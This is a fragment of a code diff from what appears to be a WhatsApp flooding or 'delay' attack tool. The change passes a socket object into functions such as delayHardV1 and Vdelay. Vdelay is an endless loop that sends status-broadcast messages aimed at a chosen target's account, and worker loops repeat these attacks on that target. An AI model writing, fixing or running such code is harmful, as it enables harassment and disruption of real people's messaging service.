@@ -2151,7 +2151,7 @@ Status      : Success
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await delayHardV1(target);
+                    await delayHardV1(sock, target);
                     await sleep(1000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3158,7 +3158,7 @@ async function P7X(sock, target) {
 }, { participant: { jid: target }});
 }
 
-async function Vdelay(target) {
+async function Vdelay(sock, target) {
   while (true) {
     await sock.sendMessage("status@broadcast", {
       text: "WHY",
